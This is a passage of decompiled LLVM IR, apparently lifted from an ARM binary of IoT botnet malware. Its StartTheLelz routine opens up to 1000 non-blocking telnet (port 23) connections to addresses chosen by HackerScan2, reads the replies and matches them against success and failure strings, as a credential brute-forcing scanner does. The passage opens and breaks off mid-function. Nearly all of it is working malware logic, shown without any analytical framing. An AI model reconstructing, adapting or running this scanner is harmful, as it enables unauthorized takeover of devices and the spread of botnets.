  uselistorder label %dec_label_pc_ddb4, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_de38.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_ddf8 = load i32, i32* @fp, align 4
  store i32 %v3_ddf8, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_de24 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_de38

dec_label_pc_de38:                                ; preds = %dec_label_pc_de38.lr.ph, %dec_label_pc_de38
  %storemerge25 = phi i32 [ 0, %dec_label_pc_de38.lr.ph ], [ %v1_de4c, %dec_label_pc_de38 ]
  %v5_de44 = mul nuw nsw i32 %storemerge25, 4
  %v6_de44 = add i32 %v5_de44, %v2_de24
  %v7_de44 = inttoptr i32 %v6_de44 to i32*
  store i32 0, i32* %v7_de44, align 4
  %v1_de4c = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_de4c, 32
  br i1 %tmp21, label %dec_label_pc_de38, label %dec_label_pc_de60

dec_label_pc_de60:                                ; preds = %dec_label_pc_de38
  %v13_ddf8 = ptrtoint i32* %stack_var_-16 to i32
  %v3_de64 = udiv i32 %arg1, 32
  %v3_de70 = mul nuw nsw i32 %v3_de64, 4
  %v2_de78 = add nsw i32 %v3_de70, -136
  %v2_de7c = add i32 %v2_de78, %v13_ddf8
  %v1_de80 = inttoptr i32 %v2_de7c to i32*
  %v2_de80 = load i32, i32* %v1_de80, align 4
  %v1_de88 = urem i32 %arg1, 32
  %v6_de90 = shl i32 1, %v1_de88
  %v2_de94 = or i32 %v2_de80, %v6_de90
  store i32 %v2_de94, i32* %v1_de80, align 4
  %v1_deb4 = add i32 %arg1, 1
  %v2_debc = ptrtoint i32* %stack_var_-160 to i32
  %v5_ded0 = call i32 @__libc_select(i32 %v1_deb4, i32 %v2_de24, i32 0, i32 0, i32 %v2_debc)
  %v5_dedc = icmp sgt i32 %v5_ded0, 0
  br i1 %v5_dedc, label %dec_label_pc_deec, label %dec_label_pc_dee0

dec_label_pc_dee0:                                ; preds = %dec_label_pc_de60
  br label %dec_label_pc_df0c

dec_label_pc_deec:                                ; preds = %dec_label_pc_de60
  %v5_df00 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_df0c

dec_label_pc_df0c:                                ; preds = %dec_label_pc_dee0, %dec_label_pc_deec
  %storemerge = phi i32 [ %v5_df00, %dec_label_pc_deec ], [ 0, %dec_label_pc_dee0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_de24, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_df0c, { 1, 0 }
  uselistorder label %dec_label_pc_de38, { 1, 0 }
}

define i32 @contains_success(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_df24 = load i32, i32* @fp, align 4
  %v3_df3c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([4 x i8*]* @global_var_2e19c.487 to i32))
  store i32 %v3_df24, i32* @fp, align 4
  ret i32 %v3_df3c
}

define i32 @contains_fail(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_df5c = load i32, i32* @fp, align 4
  %v3_df74 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_2e17c.496 to i32))
  store i32 %v3_df5c, i32* @fp, align 4
  ret i32 %v3_df74

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_dfc0

dec_label_pc_dfc0:                                ; preds = %dec_label_pc_dfc0, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_dfc4, %dec_label_pc_dfc0 ]
  %v1_dfc4 = add i32 %stack_var_-24.0, 1
  %v3_dfd0 = mul i32 %v1_dfc4, 4
  %v2_dfdc = add i32 %v3_dfd0, %arg2
  %v1_dfe0 = inttoptr i32 %v2_dfdc to i32*
  %v2_dfe0 = load i32, i32* %v1_dfe0, align 4
  %v2_dfe4 = icmp eq i32 %v2_dfe0, 0
  br i1 %v2_dfe4, label %dec_label_pc_e040.preheader, label %dec_label_pc_dfc0

dec_label_pc_e040.preheader:                      ; preds = %dec_label_pc_dfc0
  %v3_e018 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_e040

dec_label_pc_dff8:                                ; preds = %dec_label_pc_e040
  %v3_dffc = mul i32 %storemerge2, 4
  %v2_e008 = add i32 %v3_dffc, %arg2
  %v1_e00c = inttoptr i32 %v2_e008 to i32*
  %v2_e00c = load i32, i32* %v1_e00c, align 4
  %v4_e018 = call i32 @strcasestr(i8* %v3_e018, i32 %v2_e00c, i32 %v3_dffc)
  %v2_e020 = icmp eq i32 %v4_e018, 0
  %v1_e038 = add nuw i32 %storemerge2, 1
  br i1 %v2_e020, label %dec_label_pc_e040, label %dec_label_pc_e058

dec_label_pc_e040:                                ; preds = %dec_label_pc_dff8, %dec_label_pc_e040.preheader
  %storemerge2 = phi i32 [ %v1_e038, %dec_label_pc_dff8 ], [ 0, %dec_label_pc_e040.preheader ]
  %v5_e04c = icmp slt i32 %storemerge2, %v1_dfc4
  br i1 %v5_e04c, label %dec_label_pc_dff8, label %dec_label_pc_e058

dec_label_pc_e058:                                ; preds = %dec_label_pc_e040, %dec_label_pc_dff8
  %storemerge = phi i32 [ 1, %dec_label_pc_dff8 ], [ 0, %dec_label_pc_e040 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_dfc4, { 1, 0, 2 }
}

define i32 @StartTheLelz() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  %stack_var_-616 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_e06c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_e06c, i32* %ip.global-to-local, align 4
  %v3_e070 = load i32, i32* @r4, align 4
  store i32 %v3_e070, i32* %stack_var_-24, align 4
  store i32 57464, i32* %stack_var_-4, align 4
  %v19_e070 = ptrtoint i32* %stack_var_-24 to i32
  %v2_e074 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e074, i32* @fp, align 4
  %v2_e098 = call i32 @__GI_time(i32* null)
  store i32 %v2_e098, i32* @r4, align 4
  %v0_e0a4 = call i32 @rand_cmwc()
  %v0_e0ac = load i32, i32* @r4, align 4
  %v2_e0ac = xor i32 %v0_e0ac, %v0_e0a4
  %v1_e0b4 = call i32 @srand(i32 %v2_e0ac)
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_e0c8 = add i32 %v19_e070, -592
  %v5_e0c8 = inttoptr i32 %v4_e0c8 to i16*
  store i16 2, i16* %v5_e0c8, align 4
  %v1_e0d0 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v2_e100 = bitcast i32* %stack_var_-608 to i8*
  %v3_e100 = call i32 @__GI_memset(i8* %v2_e100, i32 0)
  %v1_e10c = call i32 @malloc(i32 1025)
  store i32 1025, i32* @r2, align 4
  %v2_e128 = inttoptr i32 %v1_e10c to i8*
  %v3_e128 = call i32 @__GI_memset(i8* %v2_e128, i32 0)
  %v1_e14c = load i32, i32* @sp, align 4
  %v1_e15c = add i32 %v1_e14c, -27993
  %v3_e160 = and i32 %v1_e15c, -8
  store i32 5000, i32* @r2, align 4
  %v2_e194 = inttoptr i32 %v3_e160 to i8*
  %v3_e194 = call i32 @__GI_memset(i8* %v2_e194, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e1a4

dec_label_pc_e1a4:                                ; preds = %entry, %dec_label_pc_e1a4
  %storemerge514 = phi i32 [ 0, %entry ], [ %v1_e220, %dec_label_pc_e1a4 ]
  %v2_e1b4 = mul nuw nsw i32 %storemerge514, 28
  %v2_e1b8 = add i32 %v2_e1b4, %v3_e160
  store i32 28, i32* @r2, align 4
  %v2_e1c8 = inttoptr i32 %v2_e1b8 to i8*
  %v3_e1c8 = call i32 @__GI_memset(i8* %v2_e1c8, i32 0)
  %v3_e1f0 = add i32 %v2_e1b8, 9
  %v4_e1f0 = inttoptr i32 %v3_e1f0 to i8*
  store i8 1, i8* %v4_e1f0, align 1
  %v2_e210 = add i32 %v2_e1b8, 24
  %v2_e218 = inttoptr i32 %v2_e210 to i32*
  store i32 %v1_e10c, i32* %v2_e218, align 4
  %v1_e220 = add nuw nsw i32 %storemerge514, 1
  store i32 %v1_e220, i32* %r2.global-to-local, align 4
  %v5_e234 = icmp slt i32 %v1_e220, 1000
  br i1 %v5_e234, label %dec_label_pc_e1a4, label %dec_label_pc_e238.preheader

dec_label_pc_e238.preheader:                      ; preds = %dec_label_pc_e1a4
  %v2_e2c0 = add i32 %v3_e160, 8
  %v2_e5c0 = or i32 %v3_e160, 4
  %v2_e6a0 = ptrtoint i32* %stack_var_-616 to i32
  %v2_e778 = ptrtoint i32* %stack_var_-328 to i32
  %v2_e874 = ptrtoint i32* %stack_var_-336 to i32
  %v2_e8d0 = ptrtoint i32* %stack_var_-344 to i32
  %v2_e8d4 = ptrtoint i32* %stack_var_-340 to i32
  %v2_ea3c = add i32 %v3_e160, 24
  %v2_f5a4 = add i32 %v3_e160, 16
  br label %dec_label_pc_e238

dec_label_pc_e238:                                ; preds = %dec_label_pc_f7d8, %dec_label_pc_e238.preheader
  br label %dec_label_pc_e244

dec_label_pc_e244:                                ; preds = %dec_label_pc_e238, %dec_label_pc_f7d8
  %storemerge612 = phi i32 [ 0, %dec_label_pc_e238 ], [ %v1_f7dc, %dec_label_pc_f7d8 ]
  %v3_e250 = mul i32 %storemerge612, 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_e258 = mul nuw nsw i32 %storemerge612, 28
  %v2_e25c = add i32 %v2_e258, %v3_e160
  %v2_e260 = add i32 %v2_e25c, 16
  %v1_e264 = inttoptr i32 %v2_e260 to i32*
  %v2_e264 = load i32, i32* %v1_e264, align 4
  %v2_e268 = icmp eq i32 %v2_e264, 0
  br i1 %v2_e268, label %dec_label_pc_e270, label %dec_label_pc_e2a8

dec_label_pc_e270:                                ; preds = %dec_label_pc_e244
  store i32 %storemerge612, i32* @r4, align 4
  %v2_e278 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_e28c = load i32, i32* @r4, align 4
  %v3_e290 = mul i32 %v0_e28c, 4
  store i32 %v3_e290, i32* %r2.global-to-local, align 4
  %v2_e298 = mul i32 %v0_e28c, 28
  %v2_e2a0 = add i32 %v2_f5a4, %v2_e298
  %v2_e2a4 = inttoptr i32 %v2_e2a0 to i32*
  store i32 %v2_e278, i32* %v2_e2a4, align 4
  br label %dec_label_pc_e2a8

dec_label_pc_e2a8:                                ; preds = %dec_label_pc_e244, %dec_label_pc_e270
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_e2c4 = add i32 %v2_e2c0, %v2_e258
  %v1_e2c8 = inttoptr i32 %v2_e2c4 to i8*
  %v2_e2c8 = load i8, i8* %v1_e2c8, align 4
  %v3_e2c8 = sext i8 %v2_e2c8 to i32
  switch i32 %v3_e2c8, label %dec_label_pc_f7d8 [
    i32 0, label %dec_label_pc_e2f8
    i32 1, label %dec_label_pc_e78c.lr.ph
    i32 2, label %dec_label_pc_ebbc
    i32 3, label %dec_label_pc_ed40
    i32 4, label %dec_label_pc_eef8
    i32 5, label %dec_label_pc_f07c
    i32 6, label %dec_label_pc_f234
    i32 7, label %dec_label_pc_f61c
  ]

dec_label_pc_e2f8:                                ; preds = %dec_label_pc_e2a8
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_e314 = add i32 %v2_e25c, 8
  %v1_e318 = add i32 %v2_e25c, 9
  %v2_e318 = inttoptr i32 %v1_e318 to i8*
  %v3_e318 = load i8, i8* %v2_e318, align 1
  %v7_e31c = icmp eq i8 %v3_e318, 1
  br i1 %v7_e31c, label %dec_label_pc_e324, label %dec_label_pc_e3d0

dec_label_pc_e324:                                ; preds = %dec_label_pc_e2f8
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_e340 = add i32 %v2_e25c, 24
  %v1_e344 = inttoptr i32 %v2_e340 to i32*
  %v2_e344 = load i32, i32* %v1_e344, align 4
  store i32 28, i32* @r2, align 4
  %v2_e370 = inttoptr i32 %v2_e25c to i8*
  %v3_e370 = call i32 @__GI_memset(i8* %v2_e370, i32 0)
  store i32 %v2_e340, i32* %r2.global-to-local, align 4
  store i32 %v2_e344, i32* %v1_e344, align 4
  store i32 %storemerge612, i32* @r4, align 4
  %v1_e3a0 = call i32 @HackerScan2(i32 24)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_e3b0 = load i32, i32* @r4, align 4
  %v3_e3b4 = mul i32 %v0_e3b0, 4
  store i32 %v3_e3b4, i32* %r2.global-to-local, align 4
  %v2_e3bc = mul i32 %v0_e3b0, 28
  %v2_e3c4 = add i32 %v2_e5c0, %v2_e3bc
  %v2_e3c8 = inttoptr i32 %v2_e3c4 to i32*
  store i32 %v1_e3a0, i32* %v2_e3c8, align 4
  br label %dec_label_pc_e55c

dec_label_pc_e3d0:                                ; preds = %dec_label_pc_e2f8
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v3_e3f0 = load i8, i8* %v2_e318, align 1
  %v2_e3f4 = icmp eq i8 %v3_e3f0, 0
  br i1 %v2_e3f4, label %dec_label_pc_e3fc, label %dec_label_pc_e55c

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_e3d0
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v1_e420 = add i32 %v2_e25c, 11
  %v2_e420 = inttoptr i32 %v1_e420 to i8*
  %v3_e420 = load i8, i8* %v2_e420, align 1
  %v1_e424 = add i8 %v3_e420, 1
  store i8 %v1_e424, i8* %v2_e420, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v1_e478 = add i32 %v2_e25c, 10
  %v2_e478 = inttoptr i32 %v1_e478 to i8*
  %v3_e478 = load i8, i8* %v2_e478, align 2
  %v1_e47c = add i8 %v3_e478, 1
  store i32 %v3_e160, i32* %ip.global-to-local, align 4
  store i32 8, i32* @lr, align 4
  store i8 %v1_e47c, i8* %v2_e478, align 2
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v3_e4cc = load i8, i8* %v2_e420, align 1
  %v7_e4d0 = icmp eq i8 %v3_e4cc, 22
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  br i1 %v7_e4d0, label %dec_label_pc_e4d8, label %dec_label_pc_e504

dec_label_pc_e4d8:                                ; preds = %dec_label_pc_e3fc
  store i32 %v2_e314, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_e318, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_e504:                                ; preds = %dec_label_pc_e3fc
  %v3_e524 = load i8, i8* %v2_e478, align 2
  %v7_e528 = icmp eq i8 %v3_e524, 22
  br i1 %v7_e528, label %dec_label_pc_e530, label %dec_label_pc_e55c

dec_label_pc_e530:                                ; preds = %dec_label_pc_e504
  store i32 %v2_e314, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_e318, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_e55c:                                ; preds = %dec_label_pc_e504, %dec_label_pc_e3d0, %dec_label_pc_e324
  store i32 2, i32* %r2.global-to-local, align 4
  store i16 2, i16* %v5_e0c8, align 4
  %v1_e574 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v3_e5a4 = call i32 @__GI_memset(i8* %v2_e100, i32 0)
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  store i32 %storemerge612, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e5e0 = call i32 @socket(i32 2, i32 1, i32 0)
  %v0_e5e8 = load i32, i32* @r4, align 4
  %v2_e5f4 = mul i32 %v0_e5e8, 28
  %v2_e5f8 = add i32 %v2_e5f4, %v3_e160
  %v2_e5fc = inttoptr i32 %v2_e5f8 to i32*
  store i32 %v3_e5e0, i32* %v2_e5fc, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v1_e618 = inttoptr i32 %v2_e25c to i32*
  %v2_e618 = load i32, i32* %v1_e618, align 4
  %v7_e61c = icmp eq i32 %v2_e618, -1
  br i1 %v7_e61c, label %dec_label_pc_f7d8, label %dec_label_pc_e624

dec_label_pc_e624:                                ; preds = %dec_label_pc_e55c
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_e63c = load i32, i32* %v1_e618, align 4
  store i32 %v2_e63c, i32* @r4, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_e658 = load i32, i32* %v1_e618, align 4
  store i32 %v2_e658, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e668 = call i32 @__libc_fcntl(i32 %v2_e658, i32 3)
  %v1_e670 = or i32 %v2_e668, 2048
  store i32 %v1_e670, i32* @r3, align 4
  %v0_e674 = load i32, i32* @r4, align 4
  store i32 %v1_e670, i32* %r2.global-to-local, align 4
  %v2_e680 = call i32 @__libc_fcntl(i32 %v0_e674, i32 4)
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_e69c = load i32, i32* %v1_e618, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e6b0 = call i32 @__libc_connect(i32 %v2_e69c, i32 %v2_e6a0, i32 16)
  %v3_e6b8 = icmp eq i32 %v3_e6b0, -1
  br i1 %v3_e6b8, label %dec_label_pc_e6c0, label %dec_label_pc_e724

dec_label_pc_e6c0:                                ; preds = %dec_label_pc_e624
  %v0_e6c0 = call i32 @__GI___errno_location()
  %v1_e6c8 = inttoptr i32 %v0_e6c0 to i32*
  %v2_e6c8 = load i32, i32* %v1_e6c8, align 4
  %v7_e6cc = icmp eq i32 %v2_e6c8, 115
  br i1 %v7_e6cc, label %dec_label_pc_e724, label %dec_label_pc_e6d4

dec_label_pc_e6d4:                                ; preds = %dec_label_pc_e6c0
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_e6ec = load i32, i32* %v1_e618, align 4
  %v3_e6f4 = call i32 @sclose(i32 %v2_e6ec, i32 %v3_e160, i32 %v3_e250)
  store i32 %v2_e314, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_e318, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_e724:                                ; preds = %dec_label_pc_e624, %dec_label_pc_e6c0
  %v3_e748 = inttoptr i32 %v2_e314 to i8*
  store i8 1, i8* %v3_e748, align 4
  store i32 %v2_e260, i32* %r2.global-to-local, align 4
  store i32 0, i32* %v1_e264, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_e78c.lr.ph:                          ; preds = %dec_label_pc_e2a8
  br label %dec_label_pc_e78c

dec_label_pc_e78c:                                ; preds = %dec_label_pc_e78c.lr.ph, %dec_label_pc_e78c
  %storemerge711 = phi i32 [ 0, %dec_label_pc_e78c.lr.ph ], [ %v1_e7a0, %dec_label_pc_e78c ]
  store i32 %v2_e778, i32* %r2.global-to-local, align 4
  %v5_e798 = mul nuw nsw i32 %storemerge711, 4
  %v6_e798 = add i32 %v5_e798, %v2_e778
  %v7_e798 = inttoptr i32 %v6_e798 to i32*
  store i32 0, i32* %v7_e798, align 4
  %v1_e7a0 = add nuw nsw i32 %storemerge711, 1
  %tmp43 = icmp ult i32 %v1_e7a0, 32
  br i1 %tmp43, label %dec_label_pc_e78c, label %dec_label_pc_e7b4

dec_label_pc_e7b4:                                ; preds = %dec_label_pc_e78c
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v1_e7cc = inttoptr i32 %v2_e25c to i32*
  %v2_e7cc = load i32, i32* %v1_e7cc, align 4
  %v3_e7d0 = udiv i32 %v2_e7cc, 32
  %v3_e7e4 = mul nuw nsw i32 %v3_e7d0, 4
  %v2_e7ec = add i32 %v3_e7e4, %v19_e070
  store i32 %v2_e7ec, i32* %r2.global-to-local, align 4
  %v2_e7f0 = add i32 %v2_e7ec, -304
  %v1_e7f4 = inttoptr i32 %v2_e7f0 to i32*
  %v2_e7f4 = load i32, i32* %v1_e7f4, align 4
  store i32 %v2_e7f4, i32* %ip.global-to-local, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_e810 = load i32, i32* %v1_e7cc, align 4
  %v1_e814 = urem i32 %v2_e810, 32
  %v6_e81c = shl i32 1, %v1_e814
  %v2_e820 = or i32 %v6_e81c, %v2_e7f4
  store i32 %v2_e820, i32* %v1_e7f4, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_e868 = load i32, i32* %v1_e7cc, align 4
  %v1_e86c = add i32 %v2_e868, 1
  store i32 %v1_e86c, i32* %r2.global-to-local, align 4
  store i32 %v2_e778, i32* %ip.global-to-local, align 4
  %v1_e878 = load i32, i32* @sp, align 4
  %v2_e878 = inttoptr i32 %v1_e878 to i32*
  store i32 %v2_e874, i32* %v2_e878, align 4
  %v0_e87c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_e778, i32* %r2.global-to-local, align 4
  %v4_e88c = load i32, i32* %stack_var_-336, align 4
  %v5_e88c = call i32 @__libc_select(i32 %v0_e87c, i32 0, i32 %v2_e778, i32 0, i32 %v4_e88c)
  %v7_e89c = icmp eq i32 %v5_e88c, 1
  br i1 %v7_e89c, label %dec_label_pc_e8a4, label %dec_label_pc_ea84

dec_label_pc_e8a4:                                ; preds = %dec_label_pc_e7b4
  store i32 4, i32* %stack_var_-340, align 4
  store i32 0, i32* %stack_var_-344, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_e8cc = load i32, i32* %v1_e7cc, align 4
  store i32 %v2_e8cc, i32* %r2.global-to-local, align 4
  store i32 %v2_e8d0, i32* %ip.global-to-local, align 4
  %v1_e8d8 = load i32, i32* @sp, align 4
  %v2_e8d8 = inttoptr i32 %v1_e8d8 to i32*
  store i32 %v2_e8d4, i32* %v2_e8d8, align 4
  %v0_e8dc = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e8ec = load i32, i32* %stack_var_-344, align 4
  %v5_e8ec = call i32 @getsockopt(i32 %v0_e8dc, i32 1, i32 4, i32 %v2_e8d0, i32 %v4_e8ec)
  %v3_e8f0 = load i32, i32* %stack_var_-344, align 4
  %v2_e8f4 = icmp eq i32 %v3_e8f0, 0
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_e98c = load i32, i32* %v1_e7cc, align 4
  br i1 %v2_e8f4, label %dec_label_pc_e974, label %dec_label_pc_e8fc

dec_label_pc_e8fc:                                ; preds = %dec_label_pc_e8a4
  %v3_e91c = call i32 @sclose(i32 %v2_e98c, i32 %v3_e160, i32 %v3_e250)
  %v2_e93c = add i32 %v2_e25c, 8
  %v3_e944 = inttoptr i32 %v2_e93c to i8*
  store i8 0, i8* %v3_e944, align 4
  store i32 %v2_e93c, i32* %r2.global-to-local, align 4
  %v3_e96c = add i32 %v2_e25c, 9
  %v4_e96c = inttoptr i32 %v3_e96c to i8*
  store i8 1, i8* %v4_e96c, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_e974:                                ; preds = %dec_label_pc_e8a4
  store i32 %v2_e98c, i32* @r4, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_e9a8 = load i32, i32* %v1_e7cc, align 4
  store i32 %v2_e9a8, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e9b8 = call i32 @__libc_fcntl(i32 %v2_e9a8, i32 3)
  %v1_e9c0 = and i32 %v2_e9b8, -2049
  store i32 %v1_e9c0, i32* @r3, align 4
  %v0_e9c4 = load i32, i32* @r4, align 4
  store i32 %v1_e9c0, i32* %r2.global-to-local, align 4
  %v2_e9d0 = call i32 @__libc_fcntl(i32 %v0_e9c4, i32 4)
  store i32 0, i32* %v1_e264, align 4
  %v3_ea20 = add i32 %v2_e25c, 20
  %v4_ea20 = inttoptr i32 %v3_ea20 to i16*
  store i16 0, i16* %v4_ea20, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_ea40 = add i32 %v2_e258, %v2_ea3c
  %v1_ea44 = inttoptr i32 %v2_ea40 to i32*
  %v2_ea44 = load i32, i32* %v1_ea44, align 4
  store i32 1024, i32* @r2, align 4
  %v2_ea54 = inttoptr i32 %v2_ea44 to i8*
  %v3_ea54 = call i32 @__GI_memset(i8* %v2_ea54, i32 0)
  %v2_ea74 = add i32 %v2_e25c, 8
  store i32 %v2_ea74, i32* %r2.global-to-local, align 4
  %v3_ea7c = inttoptr i32 %v2_ea74 to i8*
  store i8 2, i8* %v3_ea7c, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_ea84:                                ; preds = %dec_label_pc_e7b4
  %v3_ea88 = icmp eq i32 %v5_e88c, -1
  br i1 %v3_ea88, label %dec_label_pc_ea90, label %dec_label_pc_eb08

dec_label_pc_ea90:                                ; preds = %dec_label_pc_ea84
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_eaa8 = load i32, i32* %v1_e7cc, align 4
  %v3_eab0 = call i32 @sclose(i32 %v2_eaa8, i32 %v3_e160, i32 %v3_e250)
  %v2_ead0 = add i32 %v2_e25c, 8
  %v3_ead8 = inttoptr i32 %v2_ead0 to i8*
  store i8 0, i8* %v3_ead8, align 4
  store i32 %v2_ead0, i32* %r2.global-to-local, align 4
  %v3_eb00 = add i32 %v2_e25c, 9
  %v4_eb00 = inttoptr i32 %v3_eb00 to i8*
  store i8 1, i8* %v4_eb00, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_eb08:                                ; preds = %dec_label_pc_ea84
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_eb28 = load i32, i32* %v1_e264, align 4
  %v1_eb2c = add i32 %v2_eb28, 6
  store i32 %v1_eb2c, i32* @r4, align 4
  %v2_eb34 = call i32 @__GI_time(i32* null)
  %v0_eb3c = load i32, i32* @r4, align 4
  %v3_eb3c = icmp ult i32 %v0_eb3c, %v2_eb34
  br i1 %v3_eb3c, label %dec_label_pc_eb44, label %dec_label_pc_f7d8

dec_label_pc_eb44:                                ; preds = %dec_label_pc_eb08
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_eb5c = load i32, i32* %v1_e7cc, align 4
  %v3_eb64 = call i32 @sclose(i32 %v2_eb5c, i32 %v3_e160, i32 %v3_e250)
  %v2_eb84 = add i32 %v2_e25c, 8
  %v3_eb8c = inttoptr i32 %v2_eb84 to i8*
  store i8 0, i8* %v3_eb8c, align 4
  store i32 %v2_eb84, i32* %r2.global-to-local, align 4
  %v3_ebb4 = add i32 %v2_e25c, 9
  %v4_ebb4 = inttoptr i32 %v3_ebb4 to i8*
  store i8 1, i8* %v4_ebb4, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_ebbc:                                ; preds = %dec_label_pc_e2a8
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v1_ebd4 = inttoptr i32 %v2_e25c to i32*
  %v2_ebd4 = load i32, i32* %v1_ebd4, align 4
  store i32 %v2_ebd4, i32* %ip.global-to-local, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_ebf4 = add i32 %v2_e258, %v2_ea3c
  %v1_ebf8 = inttoptr i32 %v2_ebf4 to i32*
  %v2_ebf8 = load i32, i32* %v1_ebf8, align 4
  store i32 %v2_ebf8, i32* %r2.global-to-local, align 4
  %v1_ec00 = load i32, i32* @sp, align 4
  %v2_ec00 = inttoptr i32 %v1_ec00 to i32*
  store i32 ptrtoint (i32* @global_var_2e168 to i32), i32* %v2_ec00, align 4
  %v0_ec04 = load i32, i32* %ip.global-to-local, align 4
  %v4_ec10 = inttoptr i32 %v2_ebf8 to i8*
  %v5_ec10 = call i32 @read_until_response(i32 %v0_ec04, i32 10, i8* %v4_ec10, i32 1024)
  %v2_ec18 = icmp eq i32 %v5_ec10, 0
  br i1 %v2_ec18, label %dec_label_pc_ecb0, label %dec_label_pc_ec20

dec_label_pc_ec20:                                ; preds = %dec_label_pc_ebbc
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_ec40 = load i32, i32* %v1_ebf8, align 4
  %v3_ec48 = call i32 @contains_fail(i32 %v2_ec40, i32 %v3_e160, i32 %v3_e250)
  %v2_ec50 = icmp eq i32 %v3_ec48, 0
  %v2_eca0 = add i32 %v2_e25c, 8
  store i32 %v2_eca0, i32* %r2.global-to-local, align 4
  br i1 %v2_ec50, label %dec_label_pc_ec84, label %dec_label_pc_ec58

dec_label_pc_ec58:                                ; preds = %dec_label_pc_ec20
  %v3_ec7c = inttoptr i32 %v2_eca0 to i8*
